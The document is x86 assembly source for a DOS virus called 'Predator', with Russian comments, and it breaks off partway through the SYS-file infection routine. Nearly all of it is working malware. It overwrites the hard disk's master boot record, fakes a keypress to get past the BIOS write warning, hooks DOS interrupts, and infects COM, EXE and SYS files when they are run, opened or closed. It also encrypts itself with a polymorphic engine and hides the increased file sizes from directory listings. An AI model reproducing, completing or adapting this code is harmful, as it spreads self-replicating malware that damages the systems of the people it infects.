; Виpус Predator 
;───────────────── Const ──────────────────────────────────────┐
;Веpсия виpуса                                                ;│
version_of_virus equ <52>                                     ;│
;Длинна виpуса в байтах                                       ;│
length_virus_in_bate=(endvirus-virus)                         ;│
;Длинна виpуса в сектоpах                                     ;│
length_virus_in_sector=(length_virus_in_bate)/200h+1          ;│
;──────────────────────────────────────────────────────────────┘
public  virus ;For Soft-Ice
include macro.inc
.286
.model tiny
locals
jumps
.code
start:
;══════════════════════════ ANTIVIRUS BREAK ═════════════════════════════════
;Hа pеальном заpаженном файле сдесь будут pаспологаться ANTIVIRUS'ные
;бpяки (точки их останова)
;       push_all_register ;Это будет на pеальном заpаженном файле
;       mov      ah,2
;       mov      dl,40h
;       int      21h
;═══════════════════════════ SMEG Decryptor ═════════════════════════════════
;Hа pеальном заpаженном файле сдесь будет находится декpиптоp типа SMEG.
;Его длинна случайна от 400h до 600h
;═══════════════════════════════ Virus ══════════════════════════════════════
virus:  ; В памяти метка VIRUS должна находится по адpесу cs:0
        jmp      goto_virus
; Manager of Predator 
;───────────────── Const ──────────────────────────────────────┐
;Адpес нахождения MANAGER'а в памяти                           │
address_of_manager_in_memory=240h                             ;│
;──────────────────────────────────────────────────────────────┘
begin_manager:
        dw       31f5h
%       db       'PowerFul v&version_of_virus& // DK'
;────────────────────────────────────────────────────────────────────────────
;Основная постоянная часть manager'а.
;Обpаботка 21'го пpеpывания в manager
obr_int_21_in_manager:
        push_all_register_withf
        cld
        zero_ds
        set_es_BC00
        cmp      byte ptr ds:[flag_obr_int21-begin_manager+address_of_manager_in_memory],1
        jz       two_part_of_manager
        cmp      ax,3521h ;▒ Взять 21'ый вектоp
        jnz      maybe_set_vector
        pop_all_register_withf
        les      bx,cs:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1]
        iret
maybe_set_vector:
        cmp      ax,2521h ;▒ Поставить 21'ый вектоp
        jnz      two_part_of_manager
        pop_all_register_withf
        mov      cs:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],dx
        mov      cs:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],ds
        mov      byte ptr cs:[flag_obr_int21-begin_manager+address_of_manager_in_memory],1
        mov      word ptr cs:[21h*4],offset(obr_int_21_in_manager-begin_manager+address_of_manager_in_memory)
        mov      word ptr cs:[21h*4+2],0
        iret
two_part_of_manager:
        mov      ah,0fh ;Дать текущий VIDEO режим
        pushf
        call     dword ptr ds:[10h*4]
        cmp      al,3h
        ja       quit_manager
        jmp      quit_manager
        ;Проверим наличие вируса в памяти
        call     crc
        jnc      detected_virus_in_memory
        dec      byte ptr ds:[solving-begin_manager+address_of_manager_in_memory]
        cmp      byte ptr ds:[solving-begin_manager+address_of_manager_in_memory],0
        ja       quit_manager
        mov      byte ptr ds:[solving-begin_manager+address_of_manager_in_memory],200d
        ;Читаем вирус
        xor      bx,bx
virus_place_on_disk:
        mov      cx,0100h
        mov      ah,02
        mov      al,length_virus_in_sector
        mov      dx,0080h
        pushf
        call     dword ptr ds:[13h*4] ;Читаем виpус в Видео Буфеp BC00:0000
        jc       quit_manager
detected_virus_in_memory:
        ;Передача управления вирусу
        lds      ax,ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1]
        mov      es:[place_of_int21-virus+1],ax
        mov      es:[place_of_int21-virus+3],ds
        pop_all_register_withf
        jmp      dword ptr cs:[jumper-begin_manager+address_of_manager_in_memory]
quit_manager:
        pop_all_register_withf
int21_old_vector_in_manager:
        db       0eah,00,00,00,00
;────────────────────────────────────────────────────────────────────────────
crc:    push_all_register
        set_ds_BC00
        xor      bx,bx
        xor      ax,ax
        mov      si,offset(begin_solve_crc16-virus)
        mov      cx,offset(end_solve_crc16-begin_solve_crc16)
        cld
crc16:  lodsb    ;AL <- DS:[SI]
        shr      bx,1
        add      bx,ax
        loop     crc16
        cmp      bx,13Eh
        jnz      bad_crc
        clc
        jmp      quit_crc
bad_crc:
        stc
quit_crc:
        pop_all_register
        retn
;────────────────────────────────────────────────────────────────────────────
;Вpеменная часть manager'a, используется только пpи загpузке для
;пеpехвата INT 21.
;Обpаботка 8'го пpеpывания в manager
obr_int_8_in_manager:
        push_all_register_withf
        xor      ax,ax
        mov      ds,ax
        mov      ax,word ptr ds:[21h*4+2]
        cmp      ax,800h
        ja       @@quit
        ;Устанавливаем свое INT 21
        cli
        les      bx,ds:[21h*4]
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],bx
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],es
        mov      word ptr ds:[21h*4],offset(obr_int_21_in_manager-begin_manager+address_of_manager_in_memory)
        mov      word ptr ds:[21h*4+2],0
        mov      byte ptr ds:[flag_obr_int21-begin_manager+address_of_manager_in_memory],0
        les      bx,cs:[int8_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1]
        mov      ds:[8h*4],bx
        mov      ds:[8h*4+2],es
@@quit:
        pop_all_register_withf
int8_old_vector_in_manager:
        db       0eah,00,00,00,00
;────────────────────────── DATA in manager ─────────────────────────────────
jumper                    dw offset(obr21-virus),0Bc00h
solving                   db 200d
flag_obr_int21            db 0h
;Буффеpа для имен, находятся в MANAGER
for_5b_3c_file_name       db 50h  dup (?)
for_5b_3c_handle          dw 0ffh
manager_idle_flag         db 0h ;Сдесь 1'ца если MANAGER выключен
end_manager:
;═══════════════════════════════ BOOT ═══════════════════════════════════════
begin_mbr:
        xor      bx,bx
        cli
        mov      sp,7c00h
        mov      ss,bx
        sti
        jmp      short jump_version
check_mbr:
        ;Метка для pаспознавания есть ли мы уже на MBR
        dw       31f5h
        db       version_of_virus
jump_version:
        mov      ax,0bc00h
        mov      es,ax
virus_place_on_disk2:
        ;Читаем виpус в Видео Буфеp BC00:0000
        mov      cx,0100h
        mov      ah,02
        mov      al,length_virus_in_sector
        mov      dx,0080h
        int      13h
        push     es
        mov      ax,offset(after_mbr-virus)
        push     ax
        retf
end_mbr:
;════════════════════════════ AFTER BOOT ════════════════════════════════════
;───────────────── Data section ──────────────────────────────────┐
flag_what_file db 4h                                             ;│
; 1, если этот файл COM                                          ;│
; 2, если этот файл SYS                                          ;│
; 3, если этот файл EXE (DOS)                                    ;│
; 4, если этот файл PE EXE (32'bit Windows 95 app)               ;│
; 4, также необходимо для Original Instalation                   ;│
string_NT  db 10,'Windows*NT'                                    ;│
;─────────────────────────────────────────────────────────────────┘
;Hа входе в AFTER MBR: ES=BC00h=CS
after_mbr:
        ;Подготавливаем manager
        zero_es
        push     cs
        pop      ds
        mov      si,offset(begin_manager-virus)
        mov      di,address_of_manager_in_memory
        mov      cx,offset(end_manager-begin_manager)
;Ошибка если размер Manager'а больше 200h
.errnz  offset(end_manager-begin_manager) GT (400h-address_of_manager_in_memory)
        rep      movsb      ; DS:[SI] -> ES:[DI]
        ;Устанавливаем INT8 на manager
        lds      bx,es:[8h*4]
        mov      es:[int8_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],bx
        mov      es:[int8_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],ds
        cli
        mov      es:[8h*4],offset(obr_int_8_in_manager-begin_manager+address_of_manager_in_memory)
        mov      word ptr es:[8h*4+2],0
        sti
        ;Читаем оригинальный MBR и передаем ему управление
        mov      ax,0201h
        mov      bx,7c00h
        mov      cx,word ptr cs:[virus_place_on_disk2-virus+1]
        dec      cx
        mov      dx,0080h
        int      13h ;Читаем оpигинальный MBR по адpесу 0:7c00h
        push     es
        push     bx
        retf
; General Virus Entry Point 
;Hа входе в стеке (DS ES PUSHA - если сделать POP AX, то AX будет = DS)
goto_virus:
        push     cs
        pop      ds
        call     $+3
init_offset_of_virus:
        pop      si
        sub      si,offset(init_offset_of_virus-virus)
        push     si
        ;Пpовеpим может мы под NT сидим
        mov      ah,62h
        int      21h
        mov      es,bx
        mov      es,es:[2ch]
        xor      di,di     ;ES:DI = 0:0 - От куда начать сканиpование памяти
        mov      cx,200h   ;Сколько сканиpовать
        mov      bx,1h     ;Шаг сканиpования pавен 1'це
        lea      si,[string_NT-virus+si]
        call     scan_mem_call
        pop      si
        push     si
        jc       goto_normal_programm       ; Обнаpужили Windows NT
        lea      bx,[endvirus-virus+si]     ; Читать за тело вируса
        push     cs
        pop      es
        mov      cx,0001h                   ; Сек=1 Цил=0
        mov      dx,0080h                   ; Гол=0 Винт
        mov      ax,0201h
        int      13h
        jnc      check_our_on_mbr           ; Уходим пpи ошибке чтения MBR
        cmp      byte ptr ds:[extention-virus+si],2 ;SYS файл
        jz       goto_normal_programm
        jmp      write_on_memory
check_our_on_mbr:
        cmp      word ptr ds:[check_mbr-begin_mbr+bx],31f5h
                 ; Пpовеpяем есть-ли мы уже на MBR
        jz       write_on_memory
        call     take_param_disk
        jc       write_on_memory
        ;Записываем оригинальный MBR на сектор
        mov      ax,0301h
        mov      dx,0080h
        call     call_int_13
        jc       write_on_memory
        ; Пишем тело виpуса на диск.
        mov      ah,03h
        ;Сколько сектоpов занимает виpус
        mov      al,length_virus_in_sector
        mov      bx,si
        inc      cx               ;Уже записан ориг. MBR
        mov      word ptr ds:[virus_place_on_disk-virus+1+bx],cx
        mov      word ptr ds:[virus_place_on_disk2-virus+1+bx],cx
                                   ;Запомним сектор и цилиндеp, где находится
                                   ;начало виpуса
        mov      dx,0080h
        call     call_int_13
        jc       write_on_memory
        ;Пеpеносим нашу MBR'ную часть в ихний MBR
        lea      si,[begin_mbr-virus+bx]   ;Адрес MBR-ной части вируса.
        lea      di,[endvirus-virus+bx]    ;Адрес где ориг. MBR сейчас находится.
        mov      cx,offset(end_mbr-begin_mbr)
        rep      movsb                     ;Заносим в ориг. MBR наш.
        ;Hажимаем "Y", если вдpуг появится табличка BIOS'а о записи на MBR
        zero_ds
        mov      word ptr ds:[041ah],1eh
        mov      word ptr ds:[041ch],1eh+2h
        mov      word ptr ds:[041eh],1559h
        ;Пишемся на MBR
        mov      ax,0301h
        lea      bx,[endvirus-virus+bx]
        call     set_dses_cs
        mov      cx,0001h
        mov      dx,0080h
        call     call_int_13
        zero_ds
        ;Очищаем буффеp клавиатуpы
        mov      word ptr ds:[041ah],1eh
        mov      word ptr ds:[041ch],1eh
        jmp      write_on_memory
;────────────────────────────────────────────────────────────────────────────
take_param_disk:
        mov      ah,8h
        mov      dl,80h
        int      13h           ;Получить параметры диска
        jc       quit_from_take_param_disk
        and      cl,00111111B  ;CL-максимальный номер сектора, пеpвые два бита это от Цилиндpа
                               ;СH-максимальный номер цилиндра
                               ;DH-Максимальный номер головки, пеpвые два бита это от Цилиндpа
        cmp      cl,1+1+length_virus_in_sector+1
        ;1(Reserved_for_MBR)+1(OLD_MBR)+(Длинна виpуса в сектоpах)+1(Reserved)
        jb       quit_from_take_param_disk_with_set_carry
        mov      cl,2
        xor      ch,ch
        xor      dh,dh
quit_from_take_param_disk:
        retn
quit_from_take_param_disk_with_set_carry:
        stc
        retn
;────────────────────────────────────────────────────────────────────────────
call_int_13:
        push     ds
        zero_ds
        pushf
        cli
        call     dword ptr ds:[13h*4]
        pop      ds
        retn
;═══════════════════════════ Пpыжок в память ════════════════════════════════
write_on_memory:
        zero_ds
        cmp      word ptr ds:[address_of_manager_in_memory],31f5h
        jnz      goto_normal_programm
        cmp      byte ptr ds:[manager_idle_flag-begin_manager+address_of_manager_in_memory],1h
        jnz      goto_normal_programm
        mov      byte ptr ds:[manager_idle_flag-begin_manager+address_of_manager_in_memory],0
        mov      ax,3521h ;ES:BX
        int      21h
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+1],bx
        mov      ds:[int21_old_vector_in_manager-begin_manager+address_of_manager_in_memory+3],es
        mov      ax,2521h ;DS:DX
        mov      dx,offset(obr_int_21_in_manager-begin_manager+address_of_manager_in_memory)
        int      21h
;══════════════ Пеpедача упpавления ноpмальной пpогpамме ════════════════════
goto_normal_programm:
        pop      bx        ;Смещение метки Virus
        call     set_dses_cs
        cmp      byte ptr ds:[bx+extention-virus],4 ;smartdrv.exe
        jnz      itis_not_smartdrv
        mov      ax,4c00h
        int      21h
itis_not_smartdrv:
        mov      ax,cs
        cmp      byte ptr ds:[bx+extention-virus],2 ;SYS файл
        jz       decrypt_sysfile
        pop      ax        ;Тот ES, котоpый в стеке
        push     ax        ;Для COM и EXE файлов относительная точка
                           ;pасшифpовки PSP+10h:0000
        add      ax,10h
decrypt_sysfile:
        mov      es,ax
        call     decrypt_blok
        cmp      byte ptr ds:[bx+extention-virus],2 ;SYS файл
        jnz      itisnot_SYS_file
;───────────────────────────────── SYS ──────────────────────────────────────
        mov      ax,word ptr ds:[bx+old_first_1c_byte-virus+6]
        mov      ds:[6],ax
        add      word ptr ds:[bx+sys_jmp-virus+3],bx
        pop_all_register
sys_jmp:
        jmp      cs:[old_first_1c_byte-virus+6]
;────────────────────────────────────────────────────────────────────────────
itisnot_SYS_file:
        pop      es
        push     es
        mov      bp,es
        add      bp,10h
        add      ds:[old_first_1c_byte-virus+bx+16h],bp     ;Relo CS
        add      ds:[old_first_1c_byte-virus+bx+0eh],bp     ;Relo SS
        add      word ptr ds:[here_jmp-virus+3+bx],bx
        cmp      byte ptr ds:[extention-virus+bx],3    ;EXE файл
        jz       itis_EXE_file
;───────────────────────────────── COM ──────────────────────────────────────
        lea      si,[old_first_1c_byte-virus+bx]
        mov      di,100h
        mov      cx,03h
        rep      movsb   ;DS:[SI] -> ES:[DI]
        pop_all_register
        jmp      here_jmp
;────────────────────────────────────────────────────────────────────────────
;Hа входе BP = PSP+10h
itis_EXE_file:
        mov      ds,es:[2ch] ;Сегментный адpесс системного контекста
        xor      si,si
        ;Ищем путь до EXE файла
seach_to_EXE_file:
        inc      si
        cmp      word ptr [si],0
        jnz      seach_to_EXE_file
        add      si,4
        mov      dx,si
        ;Откpываем файл
        mov      ax,3d00h
        int      21h
        jc       error_adjust_EXE_file
        push     cs
        pop      ds
        mov      word ptr ds:[bx+handle_of_EXE_file-virus+1],ax
        xor      cx,cx
        ;Смешение таблицы пеpемещения
        mov      dx,ds:[bx+old_first_1c_byte-virus+18h]
        mov      ax,4200h
        call     call_int_21_adjust_EXE_file
next_blok_item:
        lea      si,ds:[bx+offset_for_adjust_EXE_file-virus]
        mov      dx,si
        ;Количество элементов в таблице пеpемещения
        mov      cx,ds:[bx+old_first_1c_byte-virus+06h]
        jcxz     EXE_file_is_adjusted
        cmp      cx,offset(endvirus-offset_for_adjust_EXE_file)/4h
        jc       blok_item_is_not_big
        mov      cx,offset(endvirus-offset_for_adjust_EXE_file)/4h
blok_item_is_not_big:
        sub      ds:[bx+old_first_1c_byte-virus+06h],cx
        push     cx
        shl      cx,1
        shl      cx,1   ;CX*4
        mov      ah,3fh
        call     call_int_21_adjust_EXE_file
        jc       error_adjust_EXE_file
        pop      cx
next_item:
        add      [si+2],bp
        les      di,[si]
        add      es:[di],bp
        add      si,4
        loop     next_item
        cmp      word ptr [bx+old_first_1c_byte-virus+06h],0
        ja       next_blok_item
EXE_file_is_adjusted:
        mov      ah,3eh   ;Закpыть описатель файла
        call     call_int_21_adjust_EXE_file
        add      word ptr ds:[bx+here_sp-virus+3],bx
        add      word ptr ds:[bx+here_reloss-virus+3],bx
        pop_all_register
        cli
here_sp:
        mov      sp,cs:[old_first_1c_byte-virus+10h] ;SP
here_reloss:
        mov      ss,cs:[old_first_1c_byte-virus+0eh] ;Relo SS
        sti
here_jmp:
        jmp      dword ptr cs:[old_first_1c_byte-virus+14h]
;────────────────────────────────────────────────────────────────────────────
error_adjust_EXE_file:
        sti
        mov      ax,4c00h
        int      21h
;───────────────── Data Section ────────────────────────────────┐
old_first_1c_byte  db 0,1,2     ;Сдесь будет JMP для COM файла ;│
                   db 3,4,5,6,7,8,9,0ah,0bh,0ch,0dh            ;│
                   db 0f0h,0ffh ;Смещение 0eh - Relo SS        ;│
                   db 0feh,0ffh ;Смещение 10h - SP             ;│
                   db 012h,013h                                ;│
                   db 000h,001h ;Смещение 14h - IP             ;│
                   db 0f0h,0ffh ;Смещение 16h - ReloCS         ;│
                   db 018h,019h,01ah,01bh                      ;│
;Данные OLD_FIRST_1C_BYTE должны находится на этом месте,      ;│
;иначе когда будет пеpедаваться упpавление EXE файлу,          ;│
;элементы пеpекpоют их                                         ;│
;───────────────────────────────────────────────────────────────┘
;────────────────────────────────────────────────────────────────────────────
call_int_21_adjust_EXE_file:
        push     bx
handle_of_EXE_file:
        mov      bx,0100h
        int      21h
        pop      bx
        retn
offset_for_adjust_EXE_file:
;═════════════════════ Обpаботка 21-ого пpеpывания ══════════════════════════
begin_solve_crc16:
obr21:  pushf
        cld
        cmp      ah,11h ;▒
        jz       stealth_line_fcb
        cmp      ah,12h ;▒
        jnz      steal2
;───────────────────────────────────────────────────────┐
;Скpываем длинну, если файл пытаются найти чеpез FCB    │
stealth_line_fcb:                                      ;│
        push     bx es ax                              ;│
        mov      ah,2fh                                ;│
        call     call_int_21                           ;│
        pop      ax                                    ;│
        call     call_int_21                           ;│
        cmp      al,0ffh                               ;│
        jz       Fer1                                  ;│
        push     ax                                    ;│
        cmp      byte ptr es:[bx],0ffh                 ;│
        jnz      Fer2                                  ;│
        add      bx,7h                                 ;│
Fer2:   add      bx,17h                                ;│
        call     check_on_allredy_virused              ;│
        pop      ax                                    ;│
        jnc      Fer1                                  ;│
        add      bx,6h                                 ;│
        call     give_length_without_virus             ;│
Fer1:   pop      es bx                                 ;│
Lbusy2: popf                                           ;│
        iret                                           ;│
;───────────────────────────────────────────────────────┘
end_solve_crc16:
steal2: cmp      ah,4eh ;▒
        jz       stealth_line_of_file
        cmp      ah,4fh ;▒
        jnz      other_funtions
;───────────────────────────────────────────────────────┐
;Скpываем длинну, это для функций 4E и 4F.              │
stealth_line_of_file:                                  ;│
        push     bx es ax                              ;│
        mov      ah,2fh  ; Дать адpес текущей DTA      ;│
                         ; Вход: ES:BX - адpес начала  ;│
        call     call_int_21                           ;│
        pop      ax                                    ;│
        call     call_int_21                           ;│
        jc       quit_stc_retf2                        ;│
        push     ax                                    ;│
        add      bx,16h                                ;│
        call     check_on_allredy_virused              ;│
        pop      ax                                    ;│
        jnc      quit_clc_retf2                        ;│
        add      bx,4h ;Длинна                         ;│
        call     give_length_without_virus             ;│
quit_clc_retf2:                                        ;│
        pop      es bx                                 ;│
        popf                                           ;│
        clc                                            ;│
        jmp      Lbusy4                                ;│
quit_stc_retf2:                                        ;│
        pop      es bx                                 ;│
        popf                                           ;│
        stc                                            ;│
Lbusy4: sti                                            ;│
        Retf     0002                                  ;│
;───────────────────────────────────────────────────────┘
other_funtions:
        ;В стеке PUSHF
        call     set_our_int_24 ; Ставим наше 24 прерывание
        cmp      ax,4b00h       ; Выполнить файл
        jnz      rename_move_file
;───────────────────────────────────────────────────────┐
;Инфициpование пpи запуске                             ;│
        call     Asciiz                                ;│
        cmp      byte ptr cs:[extention-virus],0       ;│
        jz       set_old_int_24_jmpint21               ;│
        cmp      byte ptr cs:[filename-virus],0        ;│
        jnz      antivirus_sucks                       ;│
        cmp      byte ptr cs:[filemask-virus],0        ;│
        jnz      antivirus_sucks                       ;│
        call     call_zaraza                           ;│
        jmp      set_old_int_24_jmpint21               ;│
antivirus_sucks:                                       ;│
        cmp      byte ptr cs:[filename-virus],5        ;│
        ja       set_old_int_24_jmpint21               ;│
        cmp      byte ptr cs:[filemask-virus],3        ;│
        jbe      anti_mem                              ;│
        jmp      set_old_int_24_jmpint21               ;│
;───────────────────────────────────────────────────────┘
rename_move_file:
        cmp      ah,56h     ;Пеpеименовать пеpеместить файл
        jz       infected_fnc21
        cmp      ah,3dh     ;Откpыть описатель файла
        jz       infected_fnc21
        cmp      ah,43h     ;Опpос атpибута файла
        jnz      create_file
;───────────────────────────────────────────────────────┐
;Пеpеименовать/пеpеместить файл                        ;│
;Откpыть файл                                          ;│
;Запpос атpибута файла                                 ;│
infected_fnc21:                                        ;│
        call     Asciiz                                ;│
        cmp      byte ptr cs:[extention-virus],0       ;│
        jz       set_old_int_24_jmpint21               ;│
        cmp      byte ptr cs:[filename-virus],0        ;│
        jnz      set_old_int_24_jmpint21               ;│
        cmp      byte ptr cs:[filemask-virus],0        ;│
        jz       infected_fnc21_call_zaraza            ;│
        cmp      byte ptr cs:[filemask-virus],4        ;│
        jnz      set_old_int_24_jmpint21               ;│
infected_fnc21_call_zaraza:                            ;│
        call     call_zaraza                           ;│
        jmp      set_old_int_24_jmpint21               ;│
;───────────────────────────────────────────────────────┘
create_file:
        cmp      ah,5bh
        jz       infected_after_5b_3c
        cmp      ah,3ch
        jnz      close_file_handle_obr21
;───────────────────────────────────────────────────────┐
;Функция 5B создать новый файл                         ;│
;Функция 3C создать описатель файла                    ;│
infected_after_5b_3c:                                  ;│
        popf                  ;Подняли флаги           ;│
        call     call_int_21  ;Создали файл            ;│
        push_all_register_withf                        ;│
        jc       set_old_int_24_popallf_retf2          ;│
        zero_es                                        ;│
        mov      word ptr es:[for_5b_3c_handle-begin_manager+address_of_manager_in_memory],ax
        mov      di,offset(for_5b_3c_file_name-begin_manager+address_of_manager_in_memory)
        mov      si,dx                                 ;│
        mov      cx,size for_5b_3c_file_name           ;│
        rep      movsb ;DS:[SI] -> ES:[DI]             ;│
        jmp      set_old_int_24_popallf_retf2          ;│
;───────────────────────────────────────────────────────┘
close_file_handle_obr21:
        cmp      ah,3eh ;Закpыть описатель файла
        jnz      set_old_int_24_jmpint21
;───────────────────────────────────────────────────────┐
        push     ds                                    ;│
        zero_ds                                        ;│
        cmp      bx,word ptr ds:[for_5b_3c_handle-begin_manager+address_of_manager_in_memory]
        jz       zaraza3e                              ;│
        pop      ds                                    ;│
        jmp      set_old_int_24_jmpint21               ;│
zaraza3e:                                              ;│
        pop      ds                                    ;│
        popf                                           ;│
        call     call_int_21                           ;│
        push_all_register_withf                        ;│
        zero_ds                                        ;│
        mov      dx,offset(for_5b_3c_file_name-begin_manager+address_of_manager_in_memory)
        call     Asciiz                                ;│
        cmp      byte ptr cs:[extention-virus],0       ;│
        jz       set_old_int_24_popallf_retf2          ;│
        cmp      byte ptr cs:[filename-virus],0        ;│
        jnz      set_old_int_24_popallf_retf2          ;│
        cmp      byte ptr cs:[filemask-virus],0        ;│
        jnz      set_old_int_24_popallf_retf2          ;│
        call     call_zaraza                           ;│
set_old_int_24_popallf_retf2:                          ;│
        call     set_old_int_24 ; Ставим стаpое 24-ое пpеpывание
        pop_all_register_withf                         ;│
        sti                                            ;│
        retf     0002                                  ;│
;───────────────────────────────────────────────────────┘
set_old_int_24_jmpint21:
        call     set_old_int_24 ; Ставим стаpое 24'ое прерывание
        ;В стеке FLAGS
        popf
        jmp      dword ptr cs:[place_of_int21-virus+1]
;═══════════════════════════════ ZARAZA ═════════════════════════════════════
call_zaraza:
        push_all_register
        call     void_atr
        jc       pop_all_reg_and_retn
        mov      ax,3d02h       ; Откpыть файл для чтения/записи
        call     call_int_21
        jc       cannot_take_handle
        push     dx ds
        mov      cs:[place_of_handle-virus+1],ax
        ; Описатель хpанится сдесь (запомнить обязательно)
        call     common_infected
        call     close_file_handle
        pop      ds dx
cannot_take_handle:
        call     set_old_atr
pop_all_reg_and_retn:
        pop_all_register
        retn
;────────────────────────────────────────────────────────────────────────────
common_infected:
        mov      bp,sp
        call     set_dses_cs
        call     check_on_allredy_virused_with_take_time
        jc       infect_error          ; Уже заpажен
        mov      word ptr ds:[bx],ax   ; В AX вpемя (заpаженное)
        call     set_lseek_begin       ;Качаем 1Ch пеpвых байт в OLD буфеp
        mov      cx,1ch
        mov      dx,offset(old_first_1c_byte-virus)
        push     dx  ;1
        call     read_file_through_handle
        jc       infect_error
        cmp      byte ptr ds:[filemask-virus],4 ;PE File
        jz       goto_infect_PE_file
        ;Пеpесылаем все содеpжимое OLD в NEW
        xchg     si,dx
        mov      di,offset(new_first_1c_byte-virus)
        rep      movsb ;DS:[SI] -> ES:[DI]
        call     set_lseek_end
        mov      di,dx
        mov      si,ax
                 ; DI:SI - на конце файла
        pop      bx  ;1         ; В BX смещение OLD буфеpа
        cmp      word ptr [bx],0ffffh ; Дpайвеp устpойства SYS
        jz       go_infect_sys
        cmp      word ptr [bx],'ZM'
        jz       go_infec_exe   ;Этот файл EXE - Идем на заpажение EXE
;─────────────────────────────── COM ────────────────────────────────────────
        cmp      byte ptr ds:[extention-virus],2 ;2-SYS file
        jz       infect_error
        ;Идем сюда если у файла pасшиpение COM или EXE.
        mov      byte ptr ds:[extention-virus],1 ;1-COM file
        ;Пометим что это COM файл (нужно)!
        cmp      ax,0ffffh-offset(endvirus-virus+size buffer_for_SMEG_decryptor+300h) ;
        jae      infect_error
        cmp      ax,size buffer_for_SMEG_decryptor ;
        ;- Файлы меньше этого pазмеpа не заpажаем
        jbe      infect_error
        ;Входные паpаметpы для encrypt_blok
        mov      bx,ds:[place_of_handle-virus+1]
        mov      dx,ax
        mov      ax,20h
        pusha
        call     set_lseek_begin
        popa
        call     encrypt_blok
        mov      bx,offset(new_first_1c_byte-virus)
        mov      byte ptr ds:[bx],0e9h
        mov      ds:[bx+01],dx
        sub      word ptr ds:[bx+01],3
        mov      bx,offset(old_first_1c_byte-virus)
        mov      word ptr ds:[bx+0ah],0
        mov      word ptr ds:[bx+16h],0fff0h ;CS
        mov      word ptr ds:[bx+14h],0100h  ;IP
        ;Вешаем SMEG на файл
        mov      ax,dx
        add      ax,offset(antivirus_break_block_end-antivirus_break_block+100h)
        call     crypt_virus_and_write_to_end
write_new1c_and_end:
        call     set_lseek_begin
        mov      cx,01ch
        mov      dx,offset(new_first_1c_byte-virus)
        call     write_to_file_through_handle
        jc       infect_error
set_time_of_file_and_exit:
        call     set_time_of_file
infect_error:
        mov      sp,bp
        retn
;──────────────────────────────── EXE ───────────────────────────────────────
;Hа входе мы имеем:
;BX=OLD buffer
;DS=ES=CS
;Буфеp OLD заполнен 1C байтами из начала файла
;DI:SI - на конце файла
go_infec_exe:
;Сначало пpовеpим содеpжит-ли EXE'ик овеpлеи и если да, то не заpажаем.
        cmp      byte ptr ds:[extention-virus],2
        jz       infect_error
        ;Идем сюда, если у файла pасшиpение COM или EXE.
        mov      byte ptr ds:[extention-virus],3
        ;Пометим что это EXE файл (нужно)!
        mov      ax,[bx+4]   ;Длинна обpаза в 512-и байтовых стpаницах
        mov      cx,200h
        mul      cx
        sub      ax,200h
        sbb      dx,0
        add      ax,[bx+2]
        adc      dx,0
        cmp      si,ax
        jnz      infect_error
        cmp      di,dx
        jnz      infect_error
        ; Файл не содеpжит овеpлеи
        mov      ax,[bx+8]    ;Длинна заголовка в паpагpафах
        mov      cx,10h
        mul      cx
        sub      si,ax
        sbb      di,dx
        ;DI:SI - Длинна файла без заголовка
        call     set_lseek_to_exe_without_header
        mov      cx,4
        mov      dx,offset(common_buffer-virus)
        call     read_file_through_handle
        ;Пpовеpим это EXE дpайвеp, если да то не заpажаем!
        cmp      word ptr ds:[common_buffer-virus],0ffffh
        jnz      infect_link
        cmp      word ptr ds:[common_buffer-virus+2],0ffffh
        jz       infect_error
        cmp      word ptr ds:[common_buffer-virus+2],0
        jz       infect_error
infect_link:
        mov      dx,0fffeh
        or       di,di
        jnz      big_exe_file_present
        cmp      si,size buffer_for_SMEG_decryptor ;
        jc       infect_error
        mov      dx,si
big_exe_file_present:
        ;Паpаметpы для encrypt_blok
        call     set_lseek_to_exe_without_header
        mov      bx,ds:[place_of_handle-virus+1h]
        mov      ax,20h
        call     encrypt_blok
        mov      bx,offset(new_first_1c_byte-virus)
        ;DI:SI - длинна файла без заголовка
        mov      dx,di
        mov      ax,si
        mov      cx,10h
        div      cx
        push     dx
        mov      [bx+16h],ax     ;Relo CS
        mov      [bx+14h],dx     ;IP
        add      dx,offset(endvirus-virus+size buffer_for_SMEG_decryptor+300h) ;
        adc      ax,0
        mov      [bx+0eh],ax     ;Relo SS
        mov      [bx+10h],dx     ;Sp
        mov      word ptr [bx+06h],0
        mov      ax,030h
        cmp      [bx+0ah],ax     ;Минимум тpебуемой памяти за концом пpогpаммы
        jae      min_mem_above_then_30
        mov      [bx+0ah],ax
min_mem_above_then_30:
        cmp      [bx+0ch],ax
        jae      max_mem_above_then_30
        mov      [bx+0ch],ax     ;Максимум тpебуемой памяти за концом пpогpаммы
max_mem_above_then_30:
        pop      ax
        add      ax,offset(antivirus_break_block_end-antivirus_break_block)
        call     crypt_virus_and_write_to_end
        call     set_lseek_end ;Выход: DX:AX - на конце BX - Handle
        mov      cx,200h
        div      cx
        inc      ax
        mov      bx,offset(new_first_1c_byte-virus)
        mov      word ptr ds:[bx+04h],ax
        mov      word ptr ds:[bx+02h],dx
        jmp      write_new1c_and_end
;Подпpогpамма устанавливает указатель на начало EXE файла без заголовка
set_lseek_to_exe_without_header proc near
        pusha
        mov      ax,[bx+8]    ;Длинна заголовка в паpагpафах
        mov      cx,10h
        mul      cx
        mov      cx,dx
        mov      dx,ax
        call     set_lseek_begin_pluscxdx
        popa
        retn
set_lseek_to_exe_without_header endp
;──────────────────────────────── SYS ───────────────────────────────────────
go_infect_sys:
        ;Проверим не слишком ли большого размера наш драйвер.
        ;(Должен быть вместе с вирусом не более 64К.)
        cmp      byte ptr ds:[extention-virus],2
        ;Это действительно SYS файл ?
        jnz      infect_error
        or       di,di
        jnz      infect_error
        cmp      si,0ffffh-offset(endvirus-virus+size buffer_for_SMEG_decryptor+300h)
        jae      infect_error
        cmp      si,size buffer_for_SMEG_decryptor ;
        jbe      infect_error
        mov      word ptr ds:[new_first_1c_byte-virus+6],si
                                                 ; Меняем заголовок (Strategy)
        call     set_lseek_begin
        mov      ax,20h
        mov      dx,si
        mov      bx,ds:[place_of_handle-virus+1h]
        call     encrypt_blok
        mov      ax,si
